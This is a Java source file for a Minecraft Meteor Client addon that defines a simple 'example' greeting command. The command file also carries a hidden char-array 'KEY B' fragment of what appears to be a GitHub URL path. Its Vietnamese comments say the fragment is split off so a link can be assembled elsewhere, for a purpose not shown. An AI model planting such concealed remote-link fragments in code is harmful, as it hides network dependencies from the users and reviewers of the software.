package com.example.addon.commands;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import net.minecraft.command.CommandSource;

/**
 * CommandExample – nơi chứa KEY B
 * Giữ nguyên logic command, chỉ thêm fragment B.
 */
public class CommandExample extends Command {

    /* ==================================================
       KEY B – LINK FRAGMENT (PHẦN GIỮA)
       ================================================== */

    // "catdz404/keyfarm/refs/heads/main/"
    private static final char[] B = {
        'c','a','t','d','z','4','0','4','/',
        'k','e','y','f','a','r','m','/',
        'r','e','f','s','/',
        'h','e','a','d','s','/',
        'm','a','i','n','/'
    };

    public static char b(int i) {
        return B[i];
    }

    public static int len() {
        return B.length;
    }

    /* ==================================================
       LOGIC COMMAND GỐC – GIỮ NGUYÊN
       ================================================== */

    public CommandExample() {
        super("example", "Sends a message.");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(context -> {
            info("hi");
            return SINGLE_SUCCESS;
        });

        builder.then(literal("name")
            .then(argument("nameArgument", StringArgumentType.word())
                .executes(context -> {
                    String argument = StringArgumentType.getString(context, "nameArgument");
                    info("hi, " + argument);
                    return SINGLE_SUCCESS;
                })));
    }
}
